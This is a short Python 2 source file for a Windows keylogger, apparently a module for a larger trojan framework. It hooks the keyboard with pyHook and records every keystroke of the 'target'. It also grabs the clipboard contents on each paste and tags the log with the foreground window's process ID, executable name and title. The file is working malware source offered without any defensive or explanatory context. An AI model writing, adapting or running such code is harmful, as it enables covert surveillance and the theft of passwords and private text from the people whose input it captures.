from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 			= windll.user32
kernel32		= windll.kernel32
psapi			= windll.psapi
current_window 	= None

def get_current_process():

	#get a handle to foreground window
	hwnd = user32.GetForegroundWindow()

	#find the process ID
	pid = c_ulong(0)
	user32.GetWindowThreadProcessId(hwnd,byref(pid))

	#store process ID
	process_id = "%d" %pid.value

	#grab the exe
	executable = create_string_buffer("\x00" * 512)
	h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

	psapi.GetModuleBaseName(h_process,None,byref(executable),512)

	#now read title
	window_title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hwnd, byref(window_title),512)

	#print header if we have the correct process
	print
	print "[ PID: %s - %s - %s ]" %(process_id, executable.value, window_title.value)
	print

	#close handles
	kernel32.CloseHandle(hwnd)
	kernel32.CloseHandle(h_process)

def KeyStroke(event):
	global current_window

	#check to see if target changed windows
	if event.WindowName != current_window:
		
		current_window = event.WindowName
		get_current_process()

	#if they pressed a standard key
	if event.Ascii > 32 and event.Ascii < 127:
		
		print chr(event.Ascii),

	else:

		#if [Ctrl-V], get clipboard value
		if event.Key == "V":

			win32clipboard.OpenClipboard()
			pasted_value = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()

			print "[PASTE] - %s" %(pasted_value),

		else:

			print "[%s]" %event.Key,

	#pass execution to next hook registered
	return True

def run(**args):

	#create and register a hook manager
	kl = pyHook.HookManager()
	kl.KeyDown = KeyStroke

	#register and execute forever
	kl.HookKeyboard()
	pythoncom.PumpMessages()